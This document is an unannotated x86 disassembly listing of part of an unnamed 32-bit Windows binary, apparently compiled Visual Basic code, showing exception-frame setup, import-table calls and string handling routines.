  403ffa:	50                   	push   %eax
  403ffb:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  403ffe:	51                   	push   %ecx
  403fff:	8d 55 a8             	lea    -0x58(%ebp),%edx
  404002:	52                   	push   %edx
  404003:	ff 15 24 11 40 00    	call   *0x401124
  404009:	50                   	push   %eax
  40400a:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40400d:	50                   	push   %eax
  40400e:	ff 15 14 10 40 00    	call   *0x401014
  404014:	50                   	push   %eax
  404015:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  404018:	51                   	push   %ecx
  404019:	8d 55 ac             	lea    -0x54(%ebp),%edx
  40401c:	52                   	push   %edx
  40401d:	ff 15 24 11 40 00    	call   *0x401124
  404023:	50                   	push   %eax
  404024:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404027:	50                   	push   %eax
  404028:	e8 97 eb ff ff       	call   0x402bc4
  40402d:	66 89 85 60 ff ff ff 	mov    %ax,-0xa0(%ebp)
  404034:	ff 15 34 10 40 00    	call   *0x401034
  40403a:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  40403d:	51                   	push   %ecx
  40403e:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  404041:	52                   	push   %edx
  404042:	ff 15 b8 10 40 00    	call   *0x4010b8
  404048:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40404b:	50                   	push   %eax
  40404c:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40404f:	51                   	push   %ecx
  404050:	ff 15 b8 10 40 00    	call   *0x4010b8
  404056:	66 8b 95 60 ff ff ff 	mov    -0xa0(%ebp),%dx
  40405d:	66 89 55 bc          	mov    %dx,-0x44(%ebp)
  404061:	8d 45 a8             	lea    -0x58(%ebp),%eax
  404064:	50                   	push   %eax
  404065:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404068:	51                   	push   %ecx
  404069:	6a 02                	push   $0x2
  40406b:	ff 15 08 11 40 00    	call   *0x401108
  404071:	83 c4 0c             	add    $0xc,%esp
  404074:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  40407b:	66 c7 45 b8 ff ff    	movw   $0xffff,-0x48(%ebp)
  404081:	c7 45 fc 11 00 00 00 	movl   $0x11,-0x4(%ebp)
  404088:	0f bf 55 b8          	movswl -0x48(%ebp),%edx
  40408c:	85 d2                	test   %edx,%edx
  40408e:	0f 84 51 01 00 00    	je     0x4041e5
  404094:	c7 45 fc 12 00 00 00 	movl   $0x12,-0x4(%ebp)
  40409b:	6a 00                	push   $0x0
  40409d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4040a0:	50                   	push   %eax
  4040a1:	6a 00                	push   $0x0
  4040a3:	ff 15 2c 10 40 00    	call   *0x40102c
  4040a9:	c7 45 fc 13 00 00 00 	movl   $0x13,-0x4(%ebp)
  4040b0:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4040b3:	51                   	push   %ecx
  4040b4:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4040b7:	52                   	push   %edx
  4040b8:	ff 15 14 10 40 00    	call   *0x401014
  4040be:	50                   	push   %eax
  4040bf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4040c2:	50                   	push   %eax
  4040c3:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4040c6:	51                   	push   %ecx
  4040c7:	ff 15 24 11 40 00    	call   *0x401124
  4040cd:	50                   	push   %eax
  4040ce:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4040d1:	52                   	push   %edx
  4040d2:	e8 55 ea ff ff       	call   0x402b2c
  4040d7:	66 89 85 60 ff ff ff 	mov    %ax,-0xa0(%ebp)
  4040de:	ff 15 34 10 40 00    	call   *0x401034
  4040e4:	8b 45 ac             	mov    -0x54(%ebp),%eax
  4040e7:	50                   	push   %eax
  4040e8:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4040eb:	51                   	push   %ecx
  4040ec:	ff 15 b8 10 40 00    	call   *0x4010b8
  4040f2:	50                   	push   %eax
  4040f3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4040f6:	52                   	push   %edx
  4040f7:	6a 00                	push   $0x0
  4040f9:	ff 15 2c 10 40 00    	call   *0x40102c
  4040ff:	33 c0                	xor    %eax,%eax
  404101:	66 83 bd 60 ff ff ff 	cmpw   $0x0,-0xa0(%ebp)
  404108:	00 
  404109:	0f 95 c0             	setne  %al
  40410c:	f7 d8                	neg    %eax
  40410e:	66 89 45 b8          	mov    %ax,-0x48(%ebp)
  404112:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404115:	51                   	push   %ecx
  404116:	8d 55 ac             	lea    -0x54(%ebp),%edx
  404119:	52                   	push   %edx
  40411a:	6a 02                	push   $0x2
  40411c:	ff 15 08 11 40 00    	call   *0x401108
  404122:	83 c4 0c             	add    $0xc,%esp
  404125:	c7 45 fc 14 00 00 00 	movl   $0x14,-0x4(%ebp)
  40412c:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40412f:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  404135:	c7 85 64 ff ff ff 08 	movl   $0x8,-0x9c(%ebp)
  40413c:	00 00 00 
  40413f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404142:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  404145:	ff 15 00 11 40 00    	call   *0x401100
  40414b:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40414e:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  404154:	c7 85 74 ff ff ff 08 	movl   $0x4008,-0x8c(%ebp)
  40415b:	40 00 00 
  40415e:	8b 55 c0             	mov    -0x40(%ebp),%edx
  404161:	52                   	push   %edx
  404162:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  404168:	50                   	push   %eax
  404169:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  40416c:	51                   	push   %ecx
  40416d:	ff 15 30 11 40 00    	call   *0x401130
  404173:	8b 55 ac             	mov    -0x54(%ebp),%edx
  404176:	52                   	push   %edx
  404177:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40417a:	50                   	push   %eax
  40417b:	6a 00                	push   $0x0
  40417d:	ff 15 2c 10 40 00    	call   *0x40102c
  404183:	8d 8d 64 ff ff ff    	lea    -0x9c(%ebp),%ecx
  404189:	51                   	push   %ecx
  40418a:	8d 55 94             	lea    -0x6c(%ebp),%edx
  40418d:	52                   	push   %edx
  40418e:	8d 45 84             	lea    -0x7c(%ebp),%eax
  404191:	50                   	push   %eax
  404192:	ff 15 d0 10 40 00    	call   *0x4010d0
  404198:	50                   	push   %eax
  404199:	ff 15 10 10 40 00    	call   *0x401010
  40419f:	8b d0                	mov    %eax,%edx
  4041a1:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4041a4:	ff 15 38 11 40 00    	call   *0x401138
  4041aa:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  4041ad:	ff 15 64 11 40 00    	call   *0x401164
  4041b3:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  4041b6:	51                   	push   %ecx
  4041b7:	8d 55 94             	lea    -0x6c(%ebp),%edx
  4041ba:	52                   	push   %edx
  4041bb:	6a 02                	push   $0x2
  4041bd:	ff 15 18 10 40 00    	call   *0x401018
  4041c3:	83 c4 0c             	add    $0xc,%esp
  4041c6:	c7 45 fc 15 00 00 00 	movl   $0x15,-0x4(%ebp)
  4041cd:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4041d1:	75 0d                	jne    0x4041e0
  4041d3:	c7 45 fc 16 00 00 00 	movl   $0x16,-0x4(%ebp)
  4041da:	66 c7 45 b8 00 00    	movw   $0x0,-0x48(%ebp)
  4041e0:	e9 9c fe ff ff       	jmp    0x404081
  4041e5:	c7 45 fc 19 00 00 00 	movl   $0x19,-0x4(%ebp)
  4041ec:	8b 55 c8             	mov    -0x38(%ebp),%edx
  4041ef:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4041f2:	ff 15 00 11 40 00    	call   *0x401100
  4041f8:	c7 45 fc 1a 00 00 00 	movl   $0x1a,-0x4(%ebp)
  4041ff:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404202:	50                   	push   %eax
  404203:	e8 08 ea ff ff       	call   0x402c10
  404208:	66 89 85 60 ff ff ff 	mov    %ax,-0xa0(%ebp)
  40420f:	ff 15 34 10 40 00    	call   *0x401034
  404215:	66 8b 8d 60 ff ff ff 	mov    -0xa0(%ebp),%cx
  40421c:	66 89 4d bc          	mov    %cx,-0x44(%ebp)
  404220:	c7 45 fc 1c 00 00 00 	movl   $0x1c,-0x4(%ebp)
  404227:	8b 55 cc             	mov    -0x34(%ebp),%edx
  40422a:	52                   	push   %edx
  40422b:	e8 e0 e9 ff ff       	call   0x402c10
  404230:	66 89 85 60 ff ff ff 	mov    %ax,-0xa0(%ebp)
  404237:	ff 15 34 10 40 00    	call   *0x401034
  40423d:	66 8b 85 60 ff ff ff 	mov    -0xa0(%ebp),%ax
  404244:	66 89 45 bc          	mov    %ax,-0x44(%ebp)
  404248:	c7 45 fc 1e 00 00 00 	movl   $0x1e,-0x4(%ebp)
  40424f:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  404252:	51                   	push   %ecx
  404253:	e8 b8 e9 ff ff       	call   0x402c10
  404258:	66 89 85 60 ff ff ff 	mov    %ax,-0xa0(%ebp)
  40425f:	ff 15 34 10 40 00    	call   *0x401034
  404265:	66 8b 95 60 ff ff ff 	mov    -0xa0(%ebp),%dx
  40426c:	66 89 55 bc          	mov    %dx,-0x44(%ebp)
  404270:	68 da 42 40 00       	push   $0x4042da
  404275:	eb 3e                	jmp    0x4042b5
  404277:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40427a:	83 e0 04             	and    $0x4,%eax
  40427d:	85 c0                	test   %eax,%eax
  40427f:	74 09                	je     0x40428a
  404281:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404284:	ff 15 64 11 40 00    	call   *0x401164
  40428a:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  40428d:	51                   	push   %ecx
  40428e:	8d 55 a8             	lea    -0x58(%ebp),%edx
  404291:	52                   	push   %edx
  404292:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404295:	50                   	push   %eax
  404296:	6a 03                	push   $0x3
  404298:	ff 15 08 11 40 00    	call   *0x401108
  40429e:	83 c4 10             	add    $0x10,%esp
  4042a1:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  4042a4:	51                   	push   %ecx
  4042a5:	8d 55 94             	lea    -0x6c(%ebp),%edx
  4042a8:	52                   	push   %edx
  4042a9:	6a 02                	push   $0x2
  4042ab:	ff 15 18 10 40 00    	call   *0x401018
  4042b1:	83 c4 0c             	add    $0xc,%esp
  4042b4:	c3                   	ret
  4042b5:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4042b8:	ff 15 64 11 40 00    	call   *0x401164
  4042be:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4042c1:	ff 15 64 11 40 00    	call   *0x401164
  4042c7:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4042ca:	ff 15 64 11 40 00    	call   *0x401164
  4042d0:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4042d3:	ff 15 64 11 40 00    	call   *0x401164
  4042d9:	c3                   	ret
  4042da:	8b 45 08             	mov    0x8(%ebp),%eax
  4042dd:	8b 08                	mov    (%eax),%ecx
  4042df:	8b 55 08             	mov    0x8(%ebp),%edx
  4042e2:	52                   	push   %edx
  4042e3:	ff 51 08             	call   *0x8(%ecx)
  4042e6:	8b 45 18             	mov    0x18(%ebp),%eax
  4042e9:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4042ec:	89 08                	mov    %ecx,(%eax)
  4042ee:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4042f1:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4042f4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4042fb:	5f                   	pop    %edi
  4042fc:	5e                   	pop    %esi
  4042fd:	5b                   	pop    %ebx
  4042fe:	8b e5                	mov    %ebp,%esp
  404300:	5d                   	pop    %ebp
  404301:	c2 14 00             	ret    $0x14
  404304:	cc                   	int3
  404305:	cc                   	int3
  404306:	cc                   	int3
  404307:	cc                   	int3
  404308:	cc                   	int3
  404309:	cc                   	int3
  40430a:	cc                   	int3
  40430b:	cc                   	int3
  40430c:	cc                   	int3
  40430d:	cc                   	int3
  40430e:	cc                   	int3
  40430f:	cc                   	int3
  404310:	55                   	push   %ebp
  404311:	8b ec                	mov    %esp,%ebp
  404313:	83 ec 0c             	sub    $0xc,%esp
  404316:	68 a6 14 40 00       	push   $0x4014a6
  40431b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404321:	50                   	push   %eax
  404322:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404329:	83 ec 38             	sub    $0x38,%esp
  40432c:	53                   	push   %ebx
  40432d:	56                   	push   %esi
  40432e:	57                   	push   %edi
  40432f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  404332:	c7 45 f8 20 12 40 00 	movl   $0x401220,-0x8(%ebp)
  404339:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40433c:	8b 35 28 10 40 00    	mov    0x401028,%esi
  404342:	33 c0                	xor    %eax,%eax
  404344:	50                   	push   %eax
  404345:	68 94 2f 40 00       	push   $0x402f94
  40434a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40434d:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404350:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404353:	89 45 d0             	mov    %eax,-0x30(%ebp)
  404356:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404359:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40435c:	89 01                	mov    %eax,(%ecx)
  40435e:	ff d6                	call   *%esi
  404360:	8b 3d 38 11 40 00    	mov    0x401138,%edi
  404366:	8b d0                	mov    %eax,%edx
  404368:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40436b:	ff d7                	call   *%edi
  40436d:	50                   	push   %eax
  40436e:	68 34 26 40 00       	push   $0x402634
  404373:	ff d6                	call   *%esi
  404375:	8b d0                	mov    %eax,%edx
  404377:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40437a:	ff d7                	call   *%edi
  40437c:	50                   	push   %eax
  40437d:	68 88 2f 40 00       	push   $0x402f88
  404382:	ff d6                	call   *%esi
  404384:	8b d0                	mov    %eax,%edx
  404386:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404389:	ff d7                	call   *%edi
  40438b:	8b 1d 08 11 40 00    	mov    0x401108,%ebx
  404391:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404394:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404397:	52                   	push   %edx
  404398:	50                   	push   %eax
  404399:	6a 02                	push   $0x2
  40439b:	ff d3                	call   *%ebx
  40439d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4043a0:	83 c4 0c             	add    $0xc,%esp
  4043a3:	51                   	push   %ecx
  4043a4:	68 a0 2f 40 00       	push   $0x402fa0
  4043a9:	ff d6                	call   *%esi
  4043ab:	8b d0                	mov    %eax,%edx
  4043ad:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4043b0:	ff d7                	call   *%edi
  4043b2:	50                   	push   %eax
  4043b3:	68 88 2f 40 00       	push   $0x402f88
  4043b8:	ff d6                	call   *%esi
  4043ba:	8b d0                	mov    %eax,%edx
  4043bc:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4043bf:	ff d7                	call   *%edi
  4043c1:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4043c4:	ff 15 64 11 40 00    	call   *0x401164
  4043ca:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4043cd:	52                   	push   %edx
  4043ce:	68 88 2f 40 00       	push   $0x402f88
  4043d3:	ff d6                	call   *%esi
  4043d5:	8b d0                	mov    %eax,%edx
  4043d7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4043da:	ff d7                	call   *%edi
  4043dc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4043df:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4043e2:	50                   	push   %eax
  4043e3:	8b 51 38             	mov    0x38(%ecx),%edx
  4043e6:	52                   	push   %edx
  4043e7:	ff d6                	call   *%esi
  4043e9:	8b d0                	mov    %eax,%edx
  4043eb:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4043ee:	ff d7                	call   *%edi
  4043f0:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4043f3:	50                   	push   %eax
  4043f4:	68 88 2f 40 00       	push   $0x402f88
  4043f9:	ff d6                	call   *%esi
  4043fb:	8b d0                	mov    %eax,%edx
  4043fd:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404400:	ff d7                	call   *%edi
  404402:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404405:	51                   	push   %ecx
  404406:	68 94 2f 40 00       	push   $0x402f94
  40440b:	ff d6                	call   *%esi
  40440d:	8b d0                	mov    %eax,%edx
  40440f:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404412:	ff d7                	call   *%edi
  404414:	50                   	push   %eax
  404415:	68 34 26 40 00       	push   $0x402634
  40441a:	ff d6                	call   *%esi
  40441c:	8b d0                	mov    %eax,%edx
  40441e:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404421:	ff d7                	call   *%edi
  404423:	50                   	push   %eax
  404424:	68 88 2f 40 00       	push   $0x402f88
  404429:	ff d6                	call   *%esi
  40442b:	8b d0                	mov    %eax,%edx
  40442d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404430:	ff d7                	call   *%edi
  404432:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404435:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404438:	52                   	push   %edx
  404439:	50                   	push   %eax
  40443a:	6a 02                	push   $0x2
  40443c:	ff d3                	call   *%ebx
  40443e:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404441:	83 c4 0c             	add    $0xc,%esp
  404444:	51                   	push   %ecx
  404445:	68 50 30 40 00       	push   $0x403050
  40444a:	ff d6                	call   *%esi
  40444c:	8b d0                	mov    %eax,%edx
  40444e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404451:	ff d7                	call   *%edi
  404453:	8b 55 0c             	mov    0xc(%ebp),%edx
  404456:	50                   	push   %eax
  404457:	8b 02                	mov    (%edx),%eax
  404459:	50                   	push   %eax
  40445a:	ff d6                	call   *%esi
  40445c:	8b d0                	mov    %eax,%edx
  40445e:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404461:	ff d7                	call   *%edi
  404463:	50                   	push   %eax
  404464:	68 cc 30 40 00       	push   $0x4030cc
  404469:	ff d6                	call   *%esi
  40446b:	8b d0                	mov    %eax,%edx
  40446d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404470:	ff d7                	call   *%edi
  404472:	50                   	push   %eax
  404473:	68 88 2f 40 00       	push   $0x402f88
  404478:	ff d6                	call   *%esi
  40447a:	8b d0                	mov    %eax,%edx
  40447c:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40447f:	ff d7                	call   *%edi
  404481:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404484:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404487:	51                   	push   %ecx
  404488:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40448b:	52                   	push   %edx
  40448c:	50                   	push   %eax
  40448d:	6a 03                	push   $0x3
  40448f:	ff d3                	call   *%ebx
  404491:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404494:	83 c4 10             	add    $0x10,%esp
  404497:	51                   	push   %ecx
  404498:	68 d4 30 40 00       	push   $0x4030d4
  40449d:	ff d6                	call   *%esi
  40449f:	8b d0                	mov    %eax,%edx
  4044a1:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4044a4:	ff d7                	call   *%edi
  4044a6:	50                   	push   %eax
  4044a7:	68 88 2f 40 00       	push   $0x402f88
  4044ac:	ff d6                	call   *%esi
  4044ae:	8b d0                	mov    %eax,%edx
  4044b0:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4044b3:	ff d7                	call   *%edi
  4044b5:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4044b8:	ff 15 64 11 40 00    	call   *0x401164
  4044be:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4044c1:	52                   	push   %edx
  4044c2:	68 88 2f 40 00       	push   $0x402f88
  4044c7:	ff d6                	call   *%esi
  4044c9:	8b d0                	mov    %eax,%edx
  4044cb:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4044ce:	ff d7                	call   *%edi
  4044d0:	8b 45 08             	mov    0x8(%ebp),%eax
  4044d3:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4044d6:	52                   	push   %edx
  4044d7:	8b 55 0c             	mov    0xc(%ebp),%edx
  4044da:	8b 08                	mov    (%eax),%ecx
  4044dc:	52                   	push   %edx
  4044dd:	50                   	push   %eax
  4044de:	ff 91 04 07 00 00    	call   *0x704(%ecx)
  4044e4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4044e7:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4044ea:	50                   	push   %eax
  4044eb:	51                   	push   %ecx
  4044ec:	ff d6                	call   *%esi
  4044ee:	8b d0                	mov    %eax,%edx
  4044f0:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4044f3:	ff d7                	call   *%edi
  4044f5:	50                   	push   %eax
  4044f6:	68 88 2f 40 00       	push   $0x402f88
  4044fb:	ff d6                	call   *%esi
  4044fd:	8b d0                	mov    %eax,%edx
  4044ff:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404502:	ff d7                	call   *%edi
  404504:	8d 55 d0             	lea    -0x30(%ebp),%edx
  404507:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40450a:	52                   	push   %edx
  40450b:	50                   	push   %eax
  40450c:	6a 02                	push   $0x2
  40450e:	ff d3                	call   *%ebx
  404510:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404513:	83 c4 0c             	add    $0xc,%esp
  404516:	51                   	push   %ecx
  404517:	68 94 2f 40 00       	push   $0x402f94
  40451c:	ff d6                	call   *%esi
  40451e:	8b d0                	mov    %eax,%edx
  404520:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404523:	ff d7                	call   *%edi
  404525:	50                   	push   %eax
  404526:	68 34 26 40 00       	push   $0x402634
  40452b:	ff d6                	call   *%esi
  40452d:	8b d0                	mov    %eax,%edx
  40452f:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  404532:	ff d7                	call   *%edi
  404534:	50                   	push   %eax
  404535:	68 94 2f 40 00       	push   $0x402f94
  40453a:	ff d6                	call   *%esi
  40453c:	8b d0                	mov    %eax,%edx
  40453e:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  404541:	ff d7                	call   *%edi
  404543:	50                   	push   %eax
  404544:	68 88 2f 40 00       	push   $0x402f88
  404549:	ff d6                	call   *%esi
  40454b:	8b d0                	mov    %eax,%edx
  40454d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404550:	ff d7                	call   *%edi
  404552:	8d 55 cc             	lea    -0x34(%ebp),%edx
  404555:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404558:	52                   	push   %edx
  404559:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40455c:	50                   	push   %eax
  40455d:	51                   	push   %ecx
  40455e:	6a 03                	push   $0x3
  404560:	ff d3                	call   *%ebx
  404562:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404565:	83 c4 10             	add    $0x10,%esp
  404568:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  40456b:	8d 55 bc             	lea    -0x44(%ebp),%edx
  40456e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404571:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  404578:	ff 15 2c 11 40 00    	call   *0x40112c
  40457e:	68 b6 45 40 00       	push   $0x4045b6
  404583:	eb 27                	jmp    0x4045ac
  404585:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  404589:	74 09                	je     0x404594
  40458b:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40458e:	ff 15 0c 10 40 00    	call   *0x40100c
  404594:	8d 45 cc             	lea    -0x34(%ebp),%eax
  404597:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40459a:	50                   	push   %eax
  40459b:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40459e:	51                   	push   %ecx
  40459f:	52                   	push   %edx
  4045a0:	6a 03                	push   $0x3
  4045a2:	ff 15 08 11 40 00    	call   *0x401108
  4045a8:	83 c4 10             	add    $0x10,%esp
  4045ab:	c3                   	ret
  4045ac:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4045af:	ff 15 64 11 40 00    	call   *0x401164
  4045b5:	c3                   	ret
  4045b6:	8b 45 10             	mov    0x10(%ebp),%eax
  4045b9:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4045bc:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4045bf:	5f                   	pop    %edi
  4045c0:	89 08                	mov    %ecx,(%eax)
  4045c2:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4045c5:	5e                   	pop    %esi
  4045c6:	5b                   	pop    %ebx
  4045c7:	89 50 04             	mov    %edx,0x4(%eax)
  4045ca:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4045cd:	89 48 08             	mov    %ecx,0x8(%eax)
  4045d0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4045d3:	89 50 0c             	mov    %edx,0xc(%eax)
  4045d6:	33 c0                	xor    %eax,%eax
  4045d8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4045df:	8b e5                	mov    %ebp,%esp
  4045e1:	5d                   	pop    %ebp
  4045e2:	c2 0c 00             	ret    $0xc
  4045e5:	90                   	nop
  4045e6:	90                   	nop
  4045e7:	90                   	nop
  4045e8:	90                   	nop
  4045e9:	90                   	nop
  4045ea:	90                   	nop
  4045eb:	90                   	nop
  4045ec:	90                   	nop
  4045ed:	90                   	nop
  4045ee:	90                   	nop
  4045ef:	90                   	nop
  4045f0:	55                   	push   %ebp
  4045f1:	8b ec                	mov    %esp,%ebp
  4045f3:	83 ec 14             	sub    $0x14,%esp
  4045f6:	68 a6 14 40 00       	push   $0x4014a6
  4045fb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404601:	50                   	push   %eax
  404602:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404609:	83 ec 44             	sub    $0x44,%esp
  40460c:	53                   	push   %ebx
  40460d:	56                   	push   %esi
  40460e:	57                   	push   %edi
  40460f:	89 65 ec             	mov    %esp,-0x14(%ebp)
  404612:	c7 45 f0 30 12 40 00 	movl   $0x401230,-0x10(%ebp)
  404619:	33 ff                	xor    %edi,%edi
  40461b:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40461e:	89 7d f8             	mov    %edi,-0x8(%ebp)
  404621:	89 7d e0             	mov    %edi,-0x20(%ebp)
  404624:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404627:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  40462a:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  40462d:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  404630:	8b 45 10             	mov    0x10(%ebp),%eax
  404633:	89 38                	mov    %edi,(%eax)
  404635:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404638:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  40463b:	c7 45 b4 08 40 00 00 	movl   $0x4008,-0x4c(%ebp)
  404642:	57                   	push   %edi
  404643:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  404646:	52                   	push   %edx
  404647:	ff 15 d8 10 40 00    	call   *0x4010d8
  40464d:	8b d0                	mov    %eax,%edx
  40464f:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  404652:	ff 15 38 11 40 00    	call   *0x401138
  404658:	50                   	push   %eax
  404659:	ff 15 14 10 40 00    	call   *0x401014
  40465f:	8b f0                	mov    %eax,%esi
  404661:	f7 de                	neg    %esi
  404663:	1b f6                	sbb    %esi,%esi
  404665:	46                   	inc    %esi
  404666:	f7 de                	neg    %esi
  404668:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40466b:	ff 15 64 11 40 00    	call   *0x401164
  404671:	66 3b f7             	cmp    %di,%si
  404674:	0f 85 9c 00 00 00    	jne    0x404716
  40467a:	6a 01                	push   $0x1
  40467c:	ff 15 4c 10 40 00    	call   *0x40104c
  404682:	c7 45 cc 04 00 02 80 	movl   $0x80020004,-0x34(%ebp)
  404689:	c7 45 c4 0a 00 00 00 	movl   $0xa,-0x3c(%ebp)
  404690:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404693:	50                   	push   %eax
  404694:	ff 15 ec 10 40 00    	call   *0x4010ec
  40469a:	8b f0                	mov    %eax,%esi
  40469c:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40469f:	8b 1d 0c 10 40 00    	mov    0x40100c,%ebx
  4046a5:	ff d3                	call   *%ebx
  4046a7:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4046aa:	8b 11                	mov    (%ecx),%edx
  4046ac:	52                   	push   %edx
  4046ad:	56                   	push   %esi
  4046ae:	6a ff                	push   $0xffffffff
  4046b0:	6a 20                	push   $0x20
  4046b2:	ff 15 e4 10 40 00    	call   *0x4010e4
